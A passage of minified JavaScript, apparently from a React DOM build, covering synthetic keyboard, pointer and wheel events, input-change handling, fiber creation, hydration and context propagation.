      Apps: "ContextMenu",
      Scroll: "ScrollLock",
      MozPrintableKey: "Unidentified",
    },
    u1 = {
      8: "Backspace",
      9: "Tab",
      12: "Clear",
      13: "Enter",
      16: "Shift",
      17: "Control",
      18: "Alt",
      19: "Pause",
      20: "CapsLock",
      27: "Escape",
      32: " ",
      33: "PageUp",
      34: "PageDown",
      35: "End",
      36: "Home",
      37: "ArrowLeft",
      38: "ArrowUp",
      39: "ArrowRight",
      40: "ArrowDown",
      45: "Insert",
      46: "Delete",
      112: "F1",
      113: "F2",
      114: "F3",
      115: "F4",
      116: "F5",
      117: "F6",
      118: "F7",
      119: "F8",
      120: "F9",
      121: "F10",
      122: "F11",
      123: "F12",
      144: "NumLock",
      145: "ScrollLock",
      224: "Meta",
    },
    n1 = {
      Alt: "altKey",
      Control: "ctrlKey",
      Meta: "metaKey",
      Shift: "shiftKey",
    };
  function i1(l) {
    var t = this.nativeEvent;
    return t.getModifierState
      ? t.getModifierState(l)
      : (l = n1[l])
      ? !!t[l]
      : !1;
  }
  function si() {
    return i1;
  }
  var f1 = R({}, Ra, {
      key: function (l) {
        if (l.key) {
          var t = a1[l.key] || l.key;
          if (t !== "Unidentified") return t;
        }
        return l.type === "keypress"
          ? ((l = Uu(l)), l === 13 ? "Enter" : String.fromCharCode(l))
          : l.type === "keydown" || l.type === "keyup"
          ? u1[l.keyCode] || "Unidentified"
          : "";
      },
      code: 0,
      location: 0,
      ctrlKey: 0,
      shiftKey: 0,
      altKey: 0,
      metaKey: 0,
      repeat: 0,
      locale: 0,
      getModifierState: si,
      charCode: function (l) {
        return l.type === "keypress" ? Uu(l) : 0;
      },
      keyCode: function (l) {
        return l.type === "keydown" || l.type === "keyup" ? l.keyCode : 0;
      },
      which: function (l) {
        return l.type === "keypress"
          ? Uu(l)
          : l.type === "keydown" || l.type === "keyup"
          ? l.keyCode
          : 0;
      },
    }),
    c1 = Fl(f1),
    s1 = R({}, Bu, {
      pointerId: 0,
      width: 0,
      height: 0,
      pressure: 0,
      tangentialPressure: 0,
      tiltX: 0,
      tiltY: 0,
      twist: 0,
      pointerType: 0,
      isPrimary: 0,
    }),
    Lc = Fl(s1),
    o1 = R({}, Ra, {
      touches: 0,
      targetTouches: 0,
      changedTouches: 0,
      altKey: 0,
      metaKey: 0,
      ctrlKey: 0,
      shiftKey: 0,
      getModifierState: si,
    }),
    d1 = Fl(o1),
    r1 = R({}, je, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
    y1 = Fl(r1),
    h1 = R({}, Bu, {
      deltaX: function (l) {
        return "deltaX" in l
          ? l.deltaX
          : "wheelDeltaX" in l
          ? -l.wheelDeltaX
          : 0;
      },
      deltaY: function (l) {
        return "deltaY" in l
          ? l.deltaY
          : "wheelDeltaY" in l
          ? -l.wheelDeltaY
          : "wheelDelta" in l
          ? -l.wheelDelta
          : 0;
      },
      deltaZ: 0,
      deltaMode: 0,
    }),
    v1 = Fl(h1),
    m1 = R({}, je, { newState: 0, oldState: 0 }),
    g1 = Fl(m1),
    S1 = [9, 13, 27, 32],
    oi = Bt && "CompositionEvent" in window,
    Na = null;
  Bt && "documentMode" in document && (Na = document.documentMode);
  var b1 = Bt && "TextEvent" in window && !Na,
    Qc = Bt && (!oi || (Na && 8 < Na && 11 >= Na)),
    Zc = " ",
    Vc = !1;
  function Kc(l, t) {
    switch (l) {
      case "keyup":
        return S1.indexOf(t.keyCode) !== -1;
      case "keydown":
        return t.keyCode !== 229;
      case "keypress":
      case "mousedown":
      case "focusout":
        return !0;
      default:
        return !1;
    }
  }
  function Jc(l) {
    return (l = l.detail), typeof l == "object" && "data" in l ? l.data : null;
  }
  var Fe = !1;
  function p1(l, t) {
    switch (l) {
      case "compositionend":
        return Jc(t);
      case "keypress":
        return t.which !== 32 ? null : ((Vc = !0), Zc);
      case "textInput":
        return (l = t.data), l === Zc && Vc ? null : l;
      default:
        return null;
    }
  }
  function x1(l, t) {
    if (Fe)
      return l === "compositionend" || (!oi && Kc(l, t))
        ? ((l = qc()), (Du = ni = le = null), (Fe = !1), l)
        : null;
    switch (l) {
      case "paste":
        return null;
      case "keypress":
        if (!(t.ctrlKey || t.altKey || t.metaKey) || (t.ctrlKey && t.altKey)) {
          if (t.char && 1 < t.char.length) return t.char;
          if (t.which) return String.fromCharCode(t.which);
        }
        return null;
      case "compositionend":
        return Qc && t.locale !== "ko" ? null : t.data;
      default:
        return null;
    }
  }
  var z1 = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0,
  };
  function wc(l) {
    var t = l && l.nodeName && l.nodeName.toLowerCase();
    return t === "input" ? !!z1[l.type] : t === "textarea";
  }
  function Wc(l, t, e, a) {
    ke ? ($e ? $e.push(a) : ($e = [a])) : (ke = a),
      (t = An(t, "onChange")),
      0 < t.length &&
        ((e = new Ru("onChange", "change", null, e, a)),
        l.push({ event: e, listeners: t }));
  }
  var qa = null,
    Ya = null;
  function T1(l) {
    Dd(l, 0);
  }
  function Nu(l) {
    var t = Da(l);
    if (Oc(t)) return l;
  }
  function kc(l, t) {
    if (l === "change") return t;
  }
  var $c = !1;
  if (Bt) {
    var di;
    if (Bt) {
      var ri = "oninput" in document;
      if (!ri) {
        var Fc = document.createElement("div");
        Fc.setAttribute("oninput", "return;"),
          (ri = typeof Fc.oninput == "function");
      }
      di = ri;
    } else di = !1;
    $c = di && (!document.documentMode || 9 < document.documentMode);
  }
  function Ic() {
    qa && (qa.detachEvent("onpropertychange", Pc), (Ya = qa = null));
  }
  function Pc(l) {
    if (l.propertyName === "value" && Nu(Ya)) {
      var t = [];
      Wc(t, Ya, l, ei(l)), Nc(T1, t);
    }
  }
  function E1(l, t, e) {
    l === "focusin"
      ? (Ic(), (qa = t), (Ya = e), qa.attachEvent("onpropertychange", Pc))
      : l === "focusout" && Ic();
  }
  function A1(l) {
    if (l === "selectionchange" || l === "keyup" || l === "keydown")
      return Nu(Ya);
  }
  function j1(l, t) {
    if (l === "click") return Nu(t);
  }
  function M1(l, t) {
    if (l === "input" || l === "change") return Nu(t);
  }
  function _1(l, t) {
    return (l === t && (l !== 0 || 1 / l === 1 / t)) || (l !== l && t !== t);
  }
  var it = typeof Object.is == "function" ? Object.is : _1;
  function Ga(l, t) {
    if (it(l, t)) return !0;
    if (
      typeof l != "object" ||
      l === null ||
      typeof t != "object" ||
      t === null
    )
      return !1;
    var e = Object.keys(l),
      a = Object.keys(t);
    if (e.length !== a.length) return !1;
    for (a = 0; a < e.length; a++) {
      var u = e[a];
      if (!Zn.call(t, u) || !it(l[u], t[u])) return !1;
    }
    return !0;
  }
  function ls(l) {
    for (; l && l.firstChild; ) l = l.firstChild;
    return l;
  }
  function ts(l, t) {
    var e = ls(l);
    l = 0;
    for (var a; e; ) {
      if (e.nodeType === 3) {
        if (((a = l + e.textContent.length), l <= t && a >= t))
          return { node: e, offset: t - l };
        l = a;
      }
      l: {
        for (; e; ) {
          if (e.nextSibling) {
            e = e.nextSibling;
            break l;
          }
          e = e.parentNode;
        }
        e = void 0;
      }
      e = ls(e);
    }
  }
  function es(l, t) {
    return l && t
      ? l === t
        ? !0
        : l && l.nodeType === 3
        ? !1
        : t && t.nodeType === 3
        ? es(l, t.parentNode)
        : "contains" in l
        ? l.contains(t)
        : l.compareDocumentPosition
        ? !!(l.compareDocumentPosition(t) & 16)
        : !1
      : !1;
  }
  function as(l) {
    l =
      l != null &&
      l.ownerDocument != null &&
      l.ownerDocument.defaultView != null
        ? l.ownerDocument.defaultView
        : window;
    for (var t = Ou(l.document); t instanceof l.HTMLIFrameElement; ) {
      try {
        var e = typeof t.contentWindow.location.href == "string";
      } catch {
        e = !1;
      }
      if (e) l = t.contentWindow;
      else break;
      t = Ou(l.document);
    }
    return t;
  }
  function yi(l) {
    var t = l && l.nodeName && l.nodeName.toLowerCase();
    return (
      t &&
      ((t === "input" &&
        (l.type === "text" ||
          l.type === "search" ||
          l.type === "tel" ||
          l.type === "url" ||
          l.type === "password")) ||
        t === "textarea" ||
        l.contentEditable === "true")
    );
  }
  var O1 = Bt && "documentMode" in document && 11 >= document.documentMode,
    Ie = null,
    hi = null,
    Xa = null,
    vi = !1;
  function us(l, t, e) {
    var a =
      e.window === e ? e.document : e.nodeType === 9 ? e : e.ownerDocument;
    vi ||
      Ie == null ||
      Ie !== Ou(a) ||
      ((a = Ie),
      "selectionStart" in a && yi(a)
        ? (a = { start: a.selectionStart, end: a.selectionEnd })
        : ((a = (
            (a.ownerDocument && a.ownerDocument.defaultView) ||
            window
          ).getSelection()),
          (a = {
            anchorNode: a.anchorNode,
            anchorOffset: a.anchorOffset,
            focusNode: a.focusNode,
            focusOffset: a.focusOffset,
          })),
      (Xa && Ga(Xa, a)) ||
        ((Xa = a),
        (a = An(hi, "onSelect")),
        0 < a.length &&
          ((t = new Ru("onSelect", "select", null, t, e)),
          l.push({ event: t, listeners: a }),
          (t.target = Ie))));
  }
  function Me(l, t) {
    var e = {};
    return (
      (e[l.toLowerCase()] = t.toLowerCase()),
      (e["Webkit" + l] = "webkit" + t),
      (e["Moz" + l] = "moz" + t),
      e
    );
  }
  var Pe = {
      animationend: Me("Animation", "AnimationEnd"),
      animationiteration: Me("Animation", "AnimationIteration"),
      animationstart: Me("Animation", "AnimationStart"),
      transitionrun: Me("Transition", "TransitionRun"),
      transitionstart: Me("Transition", "TransitionStart"),
      transitioncancel: Me("Transition", "TransitionCancel"),
      transitionend: Me("Transition", "TransitionEnd"),
    },
    mi = {},
    ns = {};
  Bt &&
    ((ns = document.createElement("div").style),
    "AnimationEvent" in window ||
      (delete Pe.animationend.animation,
      delete Pe.animationiteration.animation,
      delete Pe.animationstart.animation),
    "TransitionEvent" in window || delete Pe.transitionend.transition);
  function _e(l) {
    if (mi[l]) return mi[l];
    if (!Pe[l]) return l;
    var t = Pe[l],
      e;
    for (e in t) if (t.hasOwnProperty(e) && e in ns) return (mi[l] = t[e]);
    return l;
  }
  var is = _e("animationend"),
    fs = _e("animationiteration"),
    cs = _e("animationstart"),
    C1 = _e("transitionrun"),
    D1 = _e("transitionstart"),
    U1 = _e("transitioncancel"),
    ss = _e("transitionend"),
    os = new Map(),
    gi =
      "abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
        " "
      );
  gi.push("scrollEnd");
  function At(l, t) {
    os.set(l, t), Ae(t, [l]);
  }
  var qu =
      typeof reportError == "function"
        ? reportError
        : function (l) {
            if (
              typeof window == "object" &&
              typeof window.ErrorEvent == "function"
            ) {
              var t = new window.ErrorEvent("error", {
                bubbles: !0,
                cancelable: !0,
                message:
                  typeof l == "object" &&
                  l !== null &&
                  typeof l.message == "string"
                    ? String(l.message)
                    : String(l),
                error: l,
              });
              if (!window.dispatchEvent(t)) return;
            } else if (
              typeof process == "object" &&
              typeof process.emit == "function"
            ) {
              process.emit("uncaughtException", l);
              return;
            }
            console.error(l);
          },
    gt = [],
    la = 0,
    Si = 0;
  function Yu() {
    for (var l = la, t = (Si = la = 0); t < l; ) {
      var e = gt[t];
      gt[t++] = null;
      var a = gt[t];
      gt[t++] = null;
      var u = gt[t];
      gt[t++] = null;
      var n = gt[t];
      if (((gt[t++] = null), a !== null && u !== null)) {
        var i = a.pending;
        i === null ? (u.next = u) : ((u.next = i.next), (i.next = u)),
          (a.pending = u);
      }
      n !== 0 && ds(e, u, n);
    }
  }
  function Gu(l, t, e, a) {
    (gt[la++] = l),
      (gt[la++] = t),
      (gt[la++] = e),
      (gt[la++] = a),
      (Si |= a),
      (l.lanes |= a),
      (l = l.alternate),
      l !== null && (l.lanes |= a);
  }
  function bi(l, t, e, a) {
    return Gu(l, t, e, a), Xu(l);
  }
  function Oe(l, t) {
    return Gu(l, null, null, t), Xu(l);
  }
  function ds(l, t, e) {
    l.lanes |= e;
    var a = l.alternate;
    a !== null && (a.lanes |= e);
    for (var u = !1, n = l.return; n !== null; )
      (n.childLanes |= e),
        (a = n.alternate),
        a !== null && (a.childLanes |= e),
        n.tag === 22 &&
          ((l = n.stateNode), l === null || l._visibility & 1 || (u = !0)),
        (l = n),
        (n = n.return);
    return l.tag === 3
      ? ((n = l.stateNode),
        u &&
          t !== null &&
          ((u = 31 - nt(e)),
          (l = n.hiddenUpdates),
          (a = l[u]),
          a === null ? (l[u] = [t]) : a.push(t),
          (t.lane = e | 536870912)),
        n)
      : null;
  }
  function Xu(l) {
    if (50 < cu) throw ((cu = 0), (Of = null), Error(v(185)));
    for (var t = l.return; t !== null; ) (l = t), (t = l.return);
    return l.tag === 3 ? l.stateNode : null;
  }
  var ta = {};
  function H1(l, t, e, a) {
    (this.tag = l),
      (this.key = e),
      (this.sibling =
        this.child =
        this.return =
        this.stateNode =
        this.type =
        this.elementType =
          null),
      (this.index = 0),
      (this.refCleanup = this.ref = null),
      (this.pendingProps = t),
      (this.dependencies =
        this.memoizedState =
        this.updateQueue =
        this.memoizedProps =
          null),
      (this.mode = a),
      (this.subtreeFlags = this.flags = 0),
      (this.deletions = null),
      (this.childLanes = this.lanes = 0),
      (this.alternate = null);
  }
  function ft(l, t, e, a) {
    return new H1(l, t, e, a);
  }
  function pi(l) {
    return (l = l.prototype), !(!l || !l.isReactComponent);
  }
  function Nt(l, t) {
    var e = l.alternate;
    return (
      e === null
        ? ((e = ft(l.tag, t, l.key, l.mode)),
          (e.elementType = l.elementType),
          (e.type = l.type),
          (e.stateNode = l.stateNode),
          (e.alternate = l),
          (l.alternate = e))
        : ((e.pendingProps = t),
          (e.type = l.type),
          (e.flags = 0),
          (e.subtreeFlags = 0),
          (e.deletions = null)),
      (e.flags = l.flags & 65011712),
      (e.childLanes = l.childLanes),
      (e.lanes = l.lanes),
      (e.child = l.child),
      (e.memoizedProps = l.memoizedProps),
      (e.memoizedState = l.memoizedState),
      (e.updateQueue = l.updateQueue),
      (t = l.dependencies),
      (e.dependencies =
        t === null ? null : { lanes: t.lanes, firstContext: t.firstContext }),
      (e.sibling = l.sibling),
      (e.index = l.index),
      (e.ref = l.ref),
      (e.refCleanup = l.refCleanup),
      e
    );
  }
  function rs(l, t) {
    l.flags &= 65011714;
    var e = l.alternate;
    return (
      e === null
        ? ((l.childLanes = 0),
          (l.lanes = t),
          (l.child = null),
          (l.subtreeFlags = 0),
          (l.memoizedProps = null),
          (l.memoizedState = null),
          (l.updateQueue = null),
          (l.dependencies = null),
          (l.stateNode = null))
        : ((l.childLanes = e.childLanes),
          (l.lanes = e.lanes),
          (l.child = e.child),
          (l.subtreeFlags = 0),
          (l.deletions = null),
          (l.memoizedProps = e.memoizedProps),
          (l.memoizedState = e.memoizedState),
          (l.updateQueue = e.updateQueue),
          (l.type = e.type),
          (t = e.dependencies),
          (l.dependencies =
            t === null
              ? null
              : { lanes: t.lanes, firstContext: t.firstContext })),
      l
    );
  }
  function Lu(l, t, e, a, u, n) {
    var i = 0;
    if (((a = l), typeof l == "function")) pi(l) && (i = 1);
    else if (typeof l == "string")
      i = Yr(l, e, _.current)
        ? 26
        : l === "html" || l === "head" || l === "body"
        ? 27
        : 5;
    else
      l: switch (l) {
        case ht:
          return (l = ft(31, e, t, u)), (l.elementType = ht), (l.lanes = n), l;
        case Cl:
          return Ce(e.children, u, n, t);
        case Kl:
          (i = 8), (u |= 24);
          break;
        case Hl:
          return (
            (l = ft(12, e, t, u | 2)), (l.elementType = Hl), (l.lanes = n), l
          );
        case yt:
          return (l = ft(13, e, t, u)), (l.elementType = yt), (l.lanes = n), l;
        case Bl:
          return (l = ft(19, e, t, u)), (l.elementType = Bl), (l.lanes = n), l;
        default:
          if (typeof l == "object" && l !== null)
            switch (l.$$typeof) {
              case Ml:
                i = 10;
                break l;
              case _t:
                i = 9;
                break l;
              case Rl:
                i = 11;
                break l;
              case K:
                i = 14;
                break l;
              case Nl:
                (i = 16), (a = null);
                break l;
            }
          (i = 29),
            (e = Error(v(130, l === null ? "null" : typeof l, ""))),
            (a = null);
      }
    return (
      (t = ft(i, e, t, u)), (t.elementType = l), (t.type = a), (t.lanes = n), t
    );
  }
  function Ce(l, t, e, a) {
    return (l = ft(7, l, a, t)), (l.lanes = e), l;
  }
  function xi(l, t, e) {
    return (l = ft(6, l, null, t)), (l.lanes = e), l;
  }
  function ys(l) {
    var t = ft(18, null, null, 0);
    return (t.stateNode = l), t;
  }
  function zi(l, t, e) {
    return (
      (t = ft(4, l.children !== null ? l.children : [], l.key, t)),
      (t.lanes = e),
      (t.stateNode = {
        containerInfo: l.containerInfo,
        pendingChildren: null,
        implementation: l.implementation,
      }),
      t
    );
  }
  var hs = new WeakMap();
  function St(l, t) {
    if (typeof l == "object" && l !== null) {
      var e = hs.get(l);
      return e !== void 0
        ? e
        : ((t = { value: l, source: t, stack: yc(t) }), hs.set(l, t), t);
    }
    return { value: l, source: t, stack: yc(t) };
  }
  var ea = [],
    aa = 0,
    Qu = null,
    La = 0,
    bt = [],
    pt = 0,
    te = null,
    Ot = 1,
    Ct = "";
  function qt(l, t) {
    (ea[aa++] = La), (ea[aa++] = Qu), (Qu = l), (La = t);
  }
  function vs(l, t, e) {
    (bt[pt++] = Ot), (bt[pt++] = Ct), (bt[pt++] = te), (te = l);
    var a = Ot;
    l = Ct;
    var u = 32 - nt(a) - 1;
    (a &= ~(1 << u)), (e += 1);
    var n = 32 - nt(t) + u;
    if (30 < n) {
      var i = u - (u % 5);
      (n = (a & ((1 << i) - 1)).toString(32)),
        (a >>= i),
        (u -= i),
        (Ot = (1 << (32 - nt(t) + u)) | (e << u) | a),
        (Ct = n + l);
    } else (Ot = (1 << n) | (e << u) | a), (Ct = l);
  }
  function Ti(l) {
    l.return !== null && (qt(l, 1), vs(l, 1, 0));
  }
  function Ei(l) {
    for (; l === Qu; )
      (Qu = ea[--aa]), (ea[aa] = null), (La = ea[--aa]), (ea[aa] = null);
    for (; l === te; )
      (te = bt[--pt]),
        (bt[pt] = null),
        (Ct = bt[--pt]),
        (bt[pt] = null),
        (Ot = bt[--pt]),
        (bt[pt] = null);
  }
  function ms(l, t) {
    (bt[pt++] = Ot),
      (bt[pt++] = Ct),
      (bt[pt++] = te),
      (Ot = t.id),
      (Ct = t.overflow),
      (te = l);
  }
  var Yl = null,
    yl = null,
    F = !1,
    ee = null,
    xt = !1,
    Ai = Error(v(519));
  function ae(l) {
    var t = Error(
      v(
        418,
        1 < arguments.length && arguments[1] !== void 0 && arguments[1]
          ? "text"
          : "HTML",
        ""
      )
    );
    throw (Qa(St(t, l)), Ai);
  }
  function gs(l) {
    var t = l.stateNode,
      e = l.type,
      a = l.memoizedProps;
    switch (((t[ql] = l), (t[$l] = a), e)) {
      case "dialog":
        W("cancel", t), W("close", t);
        break;
      case "iframe":
      case "object":
      case "embed":
        W("load", t);
        break;
      case "video":
      case "audio":
        for (e = 0; e < ou.length; e++) W(ou[e], t);
        break;
      case "source":
        W("error", t);
        break;
      case "img":
      case "image":
      case "link":
        W("error", t), W("load", t);
        break;
      case "details":
        W("toggle", t);
        break;
      case "input":
        W("invalid", t),
          Cc(
            t,
            a.value,
            a.defaultValue,
            a.checked,
            a.defaultChecked,
            a.type,
            a.name,
            !0
          );
        break;
      case "select":
        W("invalid", t);
        break;
      case "textarea":
        W("invalid", t), Uc(t, a.value, a.defaultValue, a.children);
    }
    (e = a.children),
      (typeof e != "string" && typeof e != "number" && typeof e != "bigint") ||
      t.textContent === "" + e ||
      a.suppressHydrationWarning === !0 ||
      Bd(t.textContent, e)
        ? (a.popover != null && (W("beforetoggle", t), W("toggle", t)),
          a.onScroll != null && W("scroll", t),
          a.onScrollEnd != null && W("scrollend", t),
          a.onClick != null && (t.onclick = Rt),
          (t = !0))
        : (t = !1),
      t || ae(l, !0);
  }
  function Ss(l) {
    for (Yl = l.return; Yl; )
      switch (Yl.tag) {
        case 5:
        case 31:
        case 13:
          xt = !1;
          return;
        case 27:
        case 3:
          xt = !0;
          return;
        default:
          Yl = Yl.return;
      }
  }
  function ua(l) {
    if (l !== Yl) return !1;
    if (!F) return Ss(l), (F = !0), !1;
    var t = l.tag,
      e;
    if (
      ((e = t !== 3 && t !== 27) &&
        ((e = t === 5) &&
          ((e = l.type),
          (e =
            !(e !== "form" && e !== "button") || Vf(l.type, l.memoizedProps))),
        (e = !e)),
      e && yl && ae(l),
      Ss(l),
      t === 13)
    ) {
      if (((l = l.memoizedState), (l = l !== null ? l.dehydrated : null), !l))
        throw Error(v(317));
      yl = Vd(l);
    } else if (t === 31) {
      if (((l = l.memoizedState), (l = l !== null ? l.dehydrated : null), !l))
        throw Error(v(317));
      yl = Vd(l);
    } else
      t === 27
        ? ((t = yl), ge(l.type) ? ((l = kf), (kf = null), (yl = l)) : (yl = t))
        : (yl = Yl ? Tt(l.stateNode.nextSibling) : null);
    return !0;
  }
  function De() {
    (yl = Yl = null), (F = !1);
  }
  function ji() {
    var l = ee;
    return (
      l !== null &&
        (tt === null ? (tt = l) : tt.push.apply(tt, l), (ee = null)),
      l
    );
  }
  function Qa(l) {
    ee === null ? (ee = [l]) : ee.push(l);
  }
  var Mi = d(null),
    Ue = null,
    Yt = null;
  function ue(l, t, e) {
    j(Mi, t._currentValue), (t._currentValue = e);
  }
  function Gt(l) {
    (l._currentValue = Mi.current), z(Mi);
  }
  function _i(l, t, e) {
    for (; l !== null; ) {
      var a = l.alternate;
      if (
        ((l.childLanes & t) !== t
          ? ((l.childLanes |= t), a !== null && (a.childLanes |= t))
          : a !== null && (a.childLanes & t) !== t && (a.childLanes |= t),
        l === e)
      )
        break;
      l = l.return;
    }
  }
  function Oi(l, t, e, a) {
    var u = l.child;
    for (u !== null && (u.return = l); u !== null; ) {
      var n = u.dependencies;
      if (n !== null) {
        var i = u.child;
        n = n.firstContext;
        l: for (; n !== null; ) {
          var f = n;
          n = u;
          for (var c = 0; c < t.length; c++)
            if (f.context === t[c]) {
              (n.lanes |= e),
                (f = n.alternate),
                f !== null && (f.lanes |= e),
                _i(n.return, e, l),
                a || (i = null);
              break l;
            }
          n = f.next;
        }
      } else if (u.tag === 18) {
        if (((i = u.return), i === null)) throw Error(v(341));
        (i.lanes |= e),
          (n = i.alternate),
          n !== null && (n.lanes |= e),
          _i(i, e, l),
          (i = null);
      } else i = u.child;
      if (i !== null) i.return = u;
      else
        for (i = u; i !== null; ) {
          if (i === l) {
            i = null;
            break;
          }
          if (((u = i.sibling), u !== null)) {
            (u.return = i.return), (i = u);
            break;
          }
          i = i.return;
        }
      u = i;
    }
  }
  function na(l, t, e, a) {
    l = null;
    for (var u = t, n = !1; u !== null; ) {
      if (!n) {
        if ((u.flags & 524288) !== 0) n = !0;
        else if ((u.flags & 262144) !== 0) break;
      }
      if (u.tag === 10) {
        var i = u.alternate;
        if (i === null) throw Error(v(387));
        if (((i = i.memoizedProps), i !== null)) {
          var f = u.type;
          it(u.pendingProps.value, i.value) ||
            (l !== null ? l.push(f) : (l = [f]));
        }
      } else if (u === el.current) {
        if (((i = u.alternate), i === null)) throw Error(v(387));
        i.memoizedState.memoizedState !== u.memoizedState.memoizedState &&
          (l !== null ? l.push(vu) : (l = [vu]));
      }
      u = u.return;
    }
    l !== null && Oi(t, l, e, a), (t.flags |= 262144);
  }
  function Zu(l) {
    for (l = l.firstContext; l !== null; ) {
      if (!it(l.context._currentValue, l.memoizedValue)) return !0;
      l = l.next;
    }
    return !1;
  }
  function He(l) {
    (Ue = l),
      (Yt = null),
      (l = l.dependencies),
      l !== null && (l.firstContext = null);
  }
  function Gl(l) {
    return bs(Ue, l);
  }
  function Vu(l, t) {
    return Ue === null && He(l), bs(l, t);
  }
  function bs(l, t) {
    var e = t._currentValue;
    if (((t = { context: t, memoizedValue: e, next: null }), Yt === null)) {
      if (l === null) throw Error(v(308));
      (Yt = t),
        (l.dependencies = { lanes: 0, firstContext: t }),
        (l.flags |= 524288);
    } else Yt = Yt.next = t;
    return e;
  }
  var R1 =
      typeof AbortController < "u"
        ? AbortController
        : function () {
            var l = [],
              t = (this.signal = {
                aborted: !1,
                addEventListener: function (e, a) {
                  l.push(a);
                },
              });
            this.abort = function () {
              (t.aborted = !0),
                l.forEach(function (e) {
                  return e();
                });
            };
          },
    B1 = E.unstable_scheduleCallback,
    N1 = E.unstable_NormalPriority,
    Tl = {
      $$typeof: Ml,
      Consumer: null,
      Provider: null,
      _currentValue: null,
      _currentValue2: null,
      _threadCount: 0,
    };
  function Ci() {
    return { controller: new R1(), data: new Map(), refCount: 0 };
  }
  function Za(l) {
    l.refCount--,
      l.refCount === 0 &&
        B1(N1, function () {
          l.controller.abort();
        });
  }
  var Va = null,
    Di = 0,
    ia = 0,
    fa = null;
  function q1(l, t) {
    if (Va === null) {
      var e = (Va = []);
      (Di = 0),
        (ia = Bf()),
        (fa = {
          status: "pending",
          value: void 0,
          then: function (a) {
            e.push(a);
          },
        });
    }
    return Di++, t.then(ps, ps), t;
  }
  function ps() {
    if (--Di === 0 && Va !== null) {
      fa !== null && (fa.status = "fulfilled");
      var l = Va;
      (Va = null), (ia = 0), (fa = null);
      for (var t = 0; t < l.length; t++) (0, l[t])();
    }
  }
  function Y1(l, t) {
    var e = [],
      a = {
        status: "pending",
        value: null,
        reason: null,
        then: function (u) {
          e.push(u);
        },
      };
    return (
      l.then(
        function () {
          (a.status = "fulfilled"), (a.value = t);
          for (var u = 0; u < e.length; u++) (0, e[u])(t);
        },
        function (u) {
          for (a.status = "rejected", a.reason = u, u = 0; u < e.length; u++)
            (0, e[u])(void 0);
        }
      ),
      a
    );
  }
  var xs = S.S;
  S.S = function (l, t) {
    (nd = at()),
      typeof t == "object" &&
        t !== null &&
        typeof t.then == "function" &&
        q1(l, t),
      xs !== null && xs(l, t);
  };
  var Re = d(null);
  function Ui() {
    var l = Re.current;
    return l !== null ? l : dl.pooledCache;
  }
  function Ku(l, t) {
    t === null ? j(Re, Re.current) : j(Re, t.pool);
  }
  function zs() {
    var l = Ui();
    return l === null ? null : { parent: Tl._currentValue, pool: l };
  }
  var ca = Error(v(460)),
    Hi = Error(v(474)),
    Ju = Error(v(542)),
    wu = { then: function () {} };
  function Ts(l) {
    return (l = l.status), l === "fulfilled" || l === "rejected";
  }
  function Es(l, t, e) {
    switch (
      ((e = l[e]),
      e === void 0 ? l.push(t) : e !== t && (t.then(Rt, Rt), (t = e)),
      t.status)
    ) {
      case "fulfilled":
        return t.value;
      case "rejected":
        throw ((l = t.reason), js(l), l);
      default:
        if (typeof t.status == "string") t.then(Rt, Rt);
        else {
          if (((l = dl), l !== null && 100 < l.shellSuspendCounter))
            throw Error(v(482));
          (l = t),
            (l.status = "pending"),
            l.then(
              function (a) {
                if (t.status === "pending") {
                  var u = t;
                  (u.status = "fulfilled"), (u.value = a);
                }
              },
              function (a) {
                if (t.status === "pending") {
                  var u = t;
                  (u.status = "rejected"), (u.reason = a);
                }
              }
            );
        }
        switch (t.status) {
          case "fulfilled":
            return t.value;
          case "rejected":
            throw ((l = t.reason), js(l), l);
        }
        throw ((Ne = t), ca);
    }
  }
  function Be(l) {
    try {
      var t = l._init;
      return t(l._payload);
    } catch (e) {
      throw e !== null && typeof e == "object" && typeof e.then == "function"
        ? ((Ne = e), ca)
        : e;
    }
  }
  var Ne = null;
  function As() {
    if (Ne === null) throw Error(v(459));
    var l = Ne;
    return (Ne = null), l;
  }
  function js(l) {
    if (l === ca || l === Ju) throw Error(v(483));
  }
  var sa = null,
    Ka = 0;
  function Wu(l) {
    var t = Ka;
    return (Ka += 1), sa === null && (sa = []), Es(sa, l, t);
  }
  function Ja(l, t) {
    (t = t.props.ref), (l.ref = t !== void 0 ? t : null);
  }
  function ku(l, t) {
    throw t.$$typeof === rl
      ? Error(v(525))
      : ((l = Object.prototype.toString.call(t)),
        Error(
          v(
            31,
            l === "[object Object]"
              ? "object with keys {" + Object.keys(t).join(", ") + "}"
              : l
          )
        ));
  }
  function Ms(l) {
    function t(r, o) {
      if (l) {
        var y = r.deletions;
        y === null ? ((r.deletions = [o]), (r.flags |= 16)) : y.push(o);
      }
    }
    function e(r, o) {
      if (!l) return null;
      for (; o !== null; ) t(r, o), (o = o.sibling);
      return null;
    }
    function a(r) {
      for (var o = new Map(); r !== null; )
        r.key !== null ? o.set(r.key, r) : o.set(r.index, r), (r = r.sibling);
      return o;
    }
    function u(r, o) {
      return (r = Nt(r, o)), (r.index = 0), (r.sibling = null), r;
    }
    function n(r, o, y) {
      return (
        (r.index = y),
        l
          ? ((y = r.alternate),
            y !== null
              ? ((y = y.index), y < o ? ((r.flags |= 67108866), o) : y)
              : ((r.flags |= 67108866), o))
          : ((r.flags |= 1048576), o)
      );
    }
    function i(r) {
      return l && r.alternate === null && (r.flags |= 67108866), r;
    }
    function f(r, o, y, p) {
      return o === null || o.tag !== 6
        ? ((o = xi(y, r.mode, p)), (o.return = r), o)
        : ((o = u(o, y)), (o.return = r), o);
    }
    function c(r, o, y, p) {
      var U = y.type;
      return U === Cl
        ? b(r, o, y.props.children, p, y.key)
        : o !== null &&
          (o.elementType === U ||
            (typeof U == "object" &&
              U !== null &&
              U.$$typeof === Nl &&
              Be(U) === o.type))
        ? ((o = u(o, y.props)), Ja(o, y), (o.return = r), o)
